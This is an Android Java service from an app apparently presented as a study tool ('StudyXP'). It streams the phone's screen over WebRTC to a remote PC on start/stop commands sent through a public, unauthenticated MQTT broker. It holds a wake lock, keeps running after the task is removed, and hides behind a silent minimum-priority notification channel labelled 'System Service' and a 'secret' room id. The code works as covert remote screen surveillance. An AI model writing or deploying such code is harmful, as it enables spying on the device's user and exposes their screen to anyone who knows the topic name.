package com.estiuk.studyxp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.media.projection.MediaProjection;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import org.eclipse.paho.client.mqttv3.IMqttDeliveryToken;
import org.eclipse.paho.client.mqttv3.MqttCallbackExtended;
import org.eclipse.paho.client.mqttv3.MqttClient;
import org.eclipse.paho.client.mqttv3.MqttConnectOptions;
import org.eclipse.paho.client.mqttv3.MqttMessage;
import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence;
import org.json.JSONObject;
import org.webrtc.DefaultVideoDecoderFactory;
import org.webrtc.DefaultVideoEncoderFactory;
import org.webrtc.EglBase;
import org.webrtc.IceCandidate;
import org.webrtc.MediaConstraints;
import org.webrtc.MediaStream;
import org.webrtc.MediaStreamTrack;
import org.webrtc.PeerConnection;
import org.webrtc.PeerConnectionFactory;
import org.webrtc.RtpCapabilities;
import org.webrtc.RtpTransceiver;
import org.webrtc.ScreenCapturerAndroid;
import org.webrtc.SdpObserver;
import org.webrtc.SessionDescription;
import org.webrtc.SurfaceTextureHelper;
import org.webrtc.VideoSource;
import org.webrtc.VideoTrack;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;

public class ScreenMirrorService extends Service {

    private static final String TAG = "StudyXP-Mirror";

    public static final String ACTION_INIT = "com.estiuk.studyxp.mirror.INIT";
    public static final String ACTION_STOP_SVC = "com.estiuk.studyxp.mirror.STOP_SVC";
    public static final String ACTION_PING = "com.estiuk.studyxp.mirror.PING";

    private static final String CHANNEL_ID = "studyxp_mirror_sys_channel";
    private static final int NOTIFICATION_ID = 9911;

    // Keep this ROOM_ID identical in receiver.py and control.py.
    private static final String ROOM_ID = "studyxp-amar-gopon-room-2025";
    private static final String MQTT_BROKER = "tcp://broker.hivemq.com:1883";

    private static final String TOPIC_CMD = "studyxp/" + ROOM_ID + "/cmd";
    private static final String TOPIC_STATUS = "studyxp/" + ROOM_ID + "/status";
    private static final String TOPIC_OFFER = "studyxp/" + ROOM_ID + "/offer";
    private static final String TOPIC_ANSWER = "studyxp/" + ROOM_ID + "/answer";
    private static final String TOPIC_ICE_PC = "studyxp/" + ROOM_ID + "/ice-pc";
    private static final String TOPIC_ICE_PHONE = "studyxp/" + ROOM_ID + "/ice-phone";

    private EglBase eglBase;
    private PeerConnectionFactory factory;
    private SurfaceTextureHelper surfaceTextureHelper;
    private VideoSource videoSource;
    private VideoTrack videoTrack;
    private ScreenCapturerAndroid screenCapturer;
    private MqttClient mqttClient;
    private PeerConnection peerConnection;

    private volatile boolean sessionActive = false;
    private volatile boolean initialized = false;
    private volatile boolean remoteDescriptionSet = false;
    private final List<IceCandidate> pendingRemoteIce = new ArrayList<>();
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        acquireWakeLock();
    }

    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(
                        PowerManager.PARTIAL_WAKE_LOCK,
                        "StudyXP::MirrorWakeLock");
                wakeLock.setReferenceCounted(false);
                wakeLock.acquire();
                Log.d(TAG, "WakeLock acquired");
            }
        } catch (Exception e) {
            Log.e(TAG, "WakeLock failed", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) {
            return initialized ? START_STICKY : START_NOT_STICKY;
        }

        String action = intent.getAction();
        if (ACTION_STOP_SVC.equals(action)) {
            fullShutdown();
            return START_NOT_STICKY;
        }
        if (ACTION_PING.equals(action)) {
            return START_STICKY;
        }

        if (!initialized && ACTION_INIT.equals(action)) {
            int resultCode = intent.getIntExtra("resultCode", 0);
            Intent resultData = intent.getParcelableExtra("resultData");
            startAsForeground();

            new Thread(() -> {
                boolean ok = initOnce(resultCode, resultData);
                if (ok) {
                    initialized = true;
                    connectMqtt();
                    publishStatus("ready");
                } else {
                    publishStatus("init-failed");
                    stopSelf();
                }
            }, "MirrorInit").start();
        }
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d(TAG, "onTaskRemoved — service will keep running");
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "onDestroy called");
        fullShutdown();
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID,
                    "System Service",
                    NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            ch.enableLights(false);
            ch.enableVibration(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private void startAsForeground() {
        Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("StudyXP Mirror")
                .setContentText("Screen sharing is ready when you start it")
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setSilent(true)
                .setOngoing(true)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, n,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(NOTIFICATION_ID, n);
        }
    }

    private boolean initOnce(int resultCode, Intent resultData) {
        try {
            PeerConnectionFactory.InitializationOptions init =
                    PeerConnectionFactory.InitializationOptions.builder(this)
                            .createInitializationOptions();
            PeerConnectionFactory.initialize(init);

            eglBase = EglBase.create();

            // Explicitly configure both video encoder and decoder factories.
            // DefaultVideoEncoderFactory includes the software VP8 encoder fallback.
            PeerConnectionFactory.Options options = new PeerConnectionFactory.Options();
            factory = PeerConnectionFactory.builder()
                    .setOptions(options)
                    .setVideoEncoderFactory(new DefaultVideoEncoderFactory(
                            eglBase.getEglBaseContext(),
                            true,
                            true))
                    .setVideoDecoderFactory(new DefaultVideoDecoderFactory(
                            eglBase.getEglBaseContext()))
                    .createPeerConnectionFactory();

            if (factory == null) {
                throw new IllegalStateException("PeerConnectionFactory creation returned null");
            }

            // Print the actual video capabilities exposed by this Android WebRTC build.
            RtpCapabilities caps = factory.getRtpSenderCapabilities(
                    MediaStreamTrack.MediaType.MEDIA_TYPE_VIDEO);
            boolean hasVp8 = false;
            for (RtpCapabilities.CodecCapability codec : caps.codecs) {
                Log.d(TAG, "Available video codec: " + codec.name
                        + ", preferredPayloadType=" + codec.preferredPayloadType
                        + ", parameters=" + codec.parameters);
                if ("VP8".equalsIgnoreCase(codec.name)) hasVp8 = true;
            }
            Log.d(TAG, "VP8 sender capability available after factory setup: " + hasVp8);

            surfaceTextureHelper = SurfaceTextureHelper.create(
                    "CaptureThread", eglBase.getEglBaseContext());
            videoSource = factory.createVideoSource(false);

            screenCapturer = new ScreenCapturerAndroid(resultData,
                    new MediaProjection.Callback() {
                        @Override
                        public void onStop() {
                            Log.d(TAG, "MediaProjection stopped by user");
                            publishStatus("permission-revoked");
                            fullShutdown();
                        }
                    });

            screenCapturer.initialize(surfaceTextureHelper, this,
                    videoSource.getCapturerObserver());
            videoTrack = factory.createVideoTrack("screen", videoSource);
            videoTrack.setEnabled(false);

            Log.d(TAG, "initOnce OK");
            return true;
        } catch (Exception e) {
            Log.e(TAG, "initOnce failed", e);
            return false;
        }
    }

    private void connectMqtt() {
        try {
            String clientId = "studyxp-phone-" + System.currentTimeMillis();
            mqttClient = new MqttClient(MQTT_BROKER, clientId, new MemoryPersistence());

            MqttConnectOptions opts = new MqttConnectOptions();
            opts.setAutomaticReconnect(true);
            opts.setCleanSession(true);
            opts.setConnectionTimeout(30);
            opts.setKeepAliveInterval(30);
            opts.setMaxInflight(20);

            mqttClient.setCallback(new MqttCallbackExtended() {
                @Override
                public void connectComplete(boolean reconnect, String serverURI) {
                    Log.d(TAG, "MQTT connected (reconnect=" + reconnect + ")");
                    try {
                        mqttClient.subscribe(TOPIC_CMD, 1);
                        mqttClient.subscribe(TOPIC_ANSWER, 1);
                        mqttClient.subscribe(TOPIC_ICE_PC, 1);
                        publishStatus(sessionActive ? "capturing" : "ready");
                    } catch (Exception e) {
                        Log.e(TAG, "subscribe failed", e);
                    }
                }

                @Override
                public void connectionLost(Throwable cause) {
                    Log.e(TAG, "MQTT connection lost", cause);
                }

                @Override
                public void messageArrived(String topic, MqttMessage message) {
                    String payload = new String(message.getPayload(), StandardCharsets.UTF_8).trim();
                    Log.d(TAG, "MSG [" + topic + "] = " + payload);
                    try {
                        if (TOPIC_CMD.equals(topic)) {
                            handleCommand(payload);
                        } else if (TOPIC_ANSWER.equals(topic)) {
                            onAnswerReceived(new JSONObject(payload));
                        } else if (TOPIC_ICE_PC.equals(topic)) {
                            onRemoteIce(new JSONObject(payload));
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "message handling failed", e);
                    }
                }

                @Override
                public void deliveryComplete(IMqttDeliveryToken token) {
                    // No action required.
                }
            });

            mqttClient.connect(opts);
        } catch (Exception e) {
            Log.e(TAG, "MQTT connect failed", e);
            publishStatus("mqtt-failed");
        }
    }

    private void publishStatus(String status) {
        try {
            MqttClient client = mqttClient;
            if (client != null && client.isConnected()) {
                client.publish(TOPIC_STATUS,
                        new MqttMessage(status.getBytes(StandardCharsets.UTF_8)));
                Log.d(TAG, "Status → " + status);
            }
        } catch (Exception e) {
            Log.w(TAG, "Could not publish status: " + status, e);
        }
    }

    private void handleCommand(String command) {
        String cmd = command.toLowerCase().trim();
        Log.d(TAG, "handleCommand: " + cmd + " (sessionActive=" + sessionActive + ")");

        if ("start".equals(cmd) && !sessionActive) {
            startSession();
        } else if ("stop".equals(cmd) && sessionActive) {
            stopSession();
        } else if ("status".equals(cmd)) {
            publishStatus(sessionActive ? "capturing" : "ready");
        }
    }

    private void startSession() {
        try {
            if (factory == null || videoTrack == null || screenCapturer == null) {
                throw new IllegalStateException("Mirror service has not been initialized");
            }

            List<PeerConnection.IceServer> iceServers = new ArrayList<>();
            iceServers.add(PeerConnection.IceServer.builder(
                    "stun:stun.l.google.com:19302").createIceServer());
            iceServers.add(PeerConnection.IceServer.builder(
                    "stun:stun1.l.google.com:19302").createIceServer());

            PeerConnection.RTCConfiguration cfg =
                    new PeerConnection.RTCConfiguration(iceServers);
            cfg.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN;
            cfg.continualGatheringPolicy =
                    PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY;

            peerConnection = factory.createPeerConnection(cfg,
                    new PeerConnection.Observer() {
                        @Override
                        public void onSignalingChange(PeerConnection.SignalingState state) {
                            Log.d(TAG, "Signaling state: " + state);
                        }

                        @Override
                        public void onIceConnectionChange(PeerConnection.IceConnectionState state) {
                            Log.d(TAG, "ICE state: " + state);
                            if (state == PeerConnection.IceConnectionState.CONNECTED
                                    || state == PeerConnection.IceConnectionState.COMPLETED) {
                                publishStatus("capturing");
                            } else if (state == PeerConnection.IceConnectionState.DISCONNECTED
                                    || state == PeerConnection.IceConnectionState.FAILED
                                    || state == PeerConnection.IceConnectionState.CLOSED) {
                                publishStatus("peer-down");
                            }
                        }

                        @Override
                        public void onIceConnectionReceivingChange(boolean receiving) {
                            Log.d(TAG, "ICE receiving: " + receiving);
                        }

                        @Override
                        public void onIceGatheringChange(PeerConnection.IceGatheringState state) {
                            Log.d(TAG, "ICE gathering: " + state);
                        }

                        @Override
                        public void onIceCandidate(IceCandidate candidate) {
                            sendLocalIce(candidate);
                        }

                        @Override
                        public void onIceCandidatesRemoved(IceCandidate[] candidates) { }

                        @Override
                        public void onAddStream(MediaStream stream) { }

                        @Override
                        public void onRemoveStream(MediaStream stream) { }

                        @Override
                        public void onDataChannel(org.webrtc.DataChannel channel) { }

                        @Override
                        public void onRenegotiationNeeded() { }

                        @Override
                        public void onAddTrack(org.webrtc.RtpReceiver receiver,
                                               MediaStream[] streams) { }
                    });

            if (peerConnection == null) {
                throw new IllegalStateException("createPeerConnection returned null");
            }

            peerConnection.addTrack(videoTrack, Collections.singletonList("stream"));

            // Select VP8 explicitly because aiortc 1.9.0 supports VP8 and selected H.264 profiles.
            // This prevents a phone-specific default H.264 profile from being the only offered codec.
            RtpCapabilities videoCapabilities = factory.getRtpSenderCapabilities(
                    MediaStreamTrack.MediaType.MEDIA_TYPE_VIDEO);
            Integer vp8PayloadType = null;
            for (RtpCapabilities.CodecCapability codec : videoCapabilities.codecs) {
                if ("VP8".equalsIgnoreCase(codec.name)) {
                    vp8PayloadType = codec.preferredPayloadType;
                    break;
                }
            }

            if (vp8PayloadType == null) {
                throw new IllegalStateException(
                        "VP8 is still absent from sender capabilities after configuring "
                                + "DefaultVideoEncoderFactory. Check 'Available video codec' Logcat lines.");
            }

            List<RtpCapabilities.CodecCapability> vp8Codecs = new ArrayList<>();
            for (RtpCapabilities.CodecCapability codec : videoCapabilities.codecs) {
                if ("VP8".equalsIgnoreCase(codec.name)) {
                    vp8Codecs.add(codec);
                } else if ("rtx".equalsIgnoreCase(codec.name)) {
                    Map<String, String> params = codec.parameters;
                    if (params != null
                            && String.valueOf(vp8PayloadType).equals(params.get("apt"))) {
                        vp8Codecs.add(codec);
                    }
                }
            }

            boolean preferenceApplied = false;
            for (RtpTransceiver transceiver : peerConnection.getTransceivers()) {
                if (transceiver.getMediaType()
                        == MediaStreamTrack.MediaType.MEDIA_TYPE_VIDEO) {
                    transceiver.setCodecPreferences(vp8Codecs);
                    preferenceApplied = true;
                    break;
                }
            }
            if (!preferenceApplied) {
                throw new IllegalStateException("Could not find video transceiver for VP8 preference");
            }
            Log.d(TAG, "VP8 codec preference set for PC aiortc receiver");

            pendingRemoteIce.clear();
            remoteDescriptionSet = false;
            videoTrack.setEnabled(true);
            screenCapturer.startCapture(720, 1280, 30);

            MediaConstraints constraints = new MediaConstraints();
            peerConnection.createOffer(new SdpObserver() {
                @Override
                public void onCreateSuccess(SessionDescription offer) {
                    PeerConnection activePc = peerConnection;
                    if (activePc == null) {
                        Log.e(TAG, "Cannot set local description: PeerConnection is null");
                        return;
                    }
                    activePc.setLocalDescription(new SdpObserver() {
                        @Override public void onCreateSuccess(SessionDescription s) { }

                        @Override
                        public void onSetSuccess() {
                            Log.d(TAG, "Local offer set; sending offer through MQTT");
                            SessionDescription localDescription = activePc.getLocalDescription();
                            sendOffer(localDescription != null ? localDescription : offer);
                        }

                        @Override
                        public void onCreateFailure(String error) {
                            Log.e(TAG, "Local description create failure: " + error);
                        }

                        @Override
                        public void onSetFailure(String error) {
                            Log.e(TAG, "setLocalDescription failed: " + error);
                            publishStatus("local-description-failed");
                        }
                    }, offer);
                }

                @Override public void onSetSuccess() { }

                @Override
                public void onCreateFailure(String error) {
                    Log.e(TAG, "createOffer failed: " + error);
                    publishStatus("offer-failed");
                }

                @Override public void onSetFailure(String error) { }
            }, constraints);

            sessionActive = true;
            publishStatus("starting");
            Log.d(TAG, "Session started; waiting for SDP/ICE negotiation");
        } catch (Exception e) {
            Log.e(TAG, "startSession failed", e);
            publishStatus("start-failed");
            stopSession();
        }
    }

    private void stopSession() {
        sessionActive = false;
        remoteDescriptionSet = false;
        pendingRemoteIce.clear();

        try {
            if (screenCapturer != null) {
                try {
                    screenCapturer.stopCapture();
                } catch (Exception e) {
                    Log.w(TAG, "Screen capture was not running", e);
                }
            }
            if (videoTrack != null) videoTrack.setEnabled(false);
            if (peerConnection != null) {
                peerConnection.close();
                peerConnection = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "stopSession error", e);
        }

        publishStatus("ready");
        Log.d(TAG, "Session stopped");
    }

    private void sendOffer(SessionDescription sdp) {
        try {
            if (mqttClient == null || !mqttClient.isConnected()) {
                throw new IllegalStateException("MQTT is not connected; cannot send offer");
            }
            JSONObject obj = new JSONObject();
            obj.put("sdp", sdp.description);
            obj.put("type", sdp.type.canonicalForm());
            mqttClient.publish(TOPIC_OFFER,
                    new MqttMessage(obj.toString().getBytes(StandardCharsets.UTF_8)));
            Log.d(TAG, "Offer sent; SDP length=" + sdp.description.length());
            for (String line : sdp.description.split("\\r?\\n")) {
                if (line.startsWith("m=video") || line.toUpperCase().contains("VP8/90000")) {
                    Log.d(TAG, "Outgoing SDP: " + line);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "sendOffer failed", e);
            publishStatus("offer-send-failed");
        }
    }

    private void onAnswerReceived(JSONObject obj) {
        try {
            if (peerConnection == null) {
                Log.w(TAG, "Ignoring answer because PeerConnection is null");
                return;
            }
            SessionDescription answer = new SessionDescription(
                    SessionDescription.Type.fromCanonicalForm(obj.getString("type")),
                    obj.getString("sdp"));
            peerConnection.setRemoteDescription(new SdpObserver() {
                @Override public void onCreateSuccess(SessionDescription s) { }

                @Override
                public void onSetSuccess() {
                    Log.d(TAG, "Remote answer set successfully");
                    remoteDescriptionSet = true;
                    flushPendingRemoteIce();
                }

                @Override
                public void onCreateFailure(String error) {
                    Log.e(TAG, "Remote answer creation failure: " + error);
                }

                @Override
                public void onSetFailure(String error) {
                    Log.e(TAG, "setRemoteDescription(answer) failed: " + error);
                }
            }, answer);
        } catch (Exception e) {
            Log.e(TAG, "onAnswerReceived failed", e);
        }
    }

    private void sendLocalIce(IceCandidate candidate) {
        try {
            if (mqttClient == null || !mqttClient.isConnected()) {
                Log.w(TAG, "MQTT not connected; dropping local ICE candidate");
                return;
            }
            JSONObject obj = new JSONObject();
            obj.put("candidate", candidate.sdp);
            obj.put("sdpMid", candidate.sdpMid);
            obj.put("sdpMLineIndex", candidate.sdpMLineIndex);
            mqttClient.publish(TOPIC_ICE_PHONE,
                    new MqttMessage(obj.toString().getBytes(StandardCharsets.UTF_8)));
        } catch (Exception e) {
            Log.e(TAG, "sendLocalIce failed", e);
        }
    }

    private void onRemoteIce(JSONObject obj) {
        try {
            IceCandidate candidate = new IceCandidate(
                    obj.getString("sdpMid"),
                    obj.getInt("sdpMLineIndex"),
                    obj.getString("candidate"));

            if (peerConnection == null) {
                Log.w(TAG, "Ignoring PC ICE candidate because PeerConnection is null");
                return;
            }
            if (!remoteDescriptionSet) {
                synchronized (pendingRemoteIce) {
                    pendingRemoteIce.add(candidate);
                }
                Log.d(TAG, "Queued PC ICE candidate until remote answer is set");
                return;
            }
            boolean accepted = peerConnection.addIceCandidate(candidate);
            Log.d(TAG, "PC ICE candidate accepted=" + accepted);
        } catch (Exception e) {
            Log.e(TAG, "onRemoteIce failed", e);
        }
    }

    private void flushPendingRemoteIce() {
        if (peerConnection == null) return;
        List<IceCandidate> copy;
        synchronized (pendingRemoteIce) {
            copy = new ArrayList<>(pendingRemoteIce);
            pendingRemoteIce.clear();
        }
        for (IceCandidate candidate : copy) {
            try {
                boolean accepted = peerConnection.addIceCandidate(candidate);
                Log.d(TAG, "Queued PC ICE candidate accepted=" + accepted);
            } catch (Exception e) {
                Log.e(TAG, "Failed to add queued PC ICE candidate", e);
            }
        }
    }

    private void fullShutdown() {
        sessionActive = false;
        remoteDescriptionSet = false;
        pendingRemoteIce.clear();

        try {
            if (screenCapturer != null) {
                try {
                    screenCapturer.stopCapture();
                } catch (Exception e) {
                    Log.w(TAG, "Unable to stop screen capture cleanly", e);
                }
                try { screenCapturer.dispose(); } catch (Exception ignored) { }
                screenCapturer = null;
            }
            if (videoTrack != null) {
                try { videoTrack.dispose(); } catch (Exception ignored) { }
                videoTrack = null;
            }
            if (videoSource != null) {
                try { videoSource.dispose(); } catch (Exception ignored) { }
                videoSource = null;
            }
            if (surfaceTextureHelper != null) {
                try { surfaceTextureHelper.dispose(); } catch (Exception ignored) { }
                surfaceTextureHelper = null;
            }
            if (peerConnection != null) {
                try { peerConnection.close(); } catch (Exception ignored) { }
                peerConnection = null;
            }
            if (factory != null) {
                try { factory.dispose(); } catch (Exception ignored) { }
                factory = null;
            }
            if (eglBase != null) {
                try { eglBase.release(); } catch (Exception ignored) { }
                eglBase = null;
            }
            if (mqttClient != null) {
                try {
                    if (mqttClient.isConnected()) mqttClient.disconnect();
                    mqttClient.close();
                } catch (Exception ignored) { }
                mqttClient = null;
            }
            if (wakeLock != null) {
                try {
                    if (wakeLock.isHeld()) wakeLock.release();
                } catch (Exception ignored) { }
                wakeLock = null;
                Log.d(TAG, "WakeLock released");
            }
        } catch (Exception e) {
            Log.e(TAG, "cleanup error", e);
        }

        initialized = false;
        try { stopForeground(true); } catch (Exception ignored) { }
        stopSelf();
    }
}
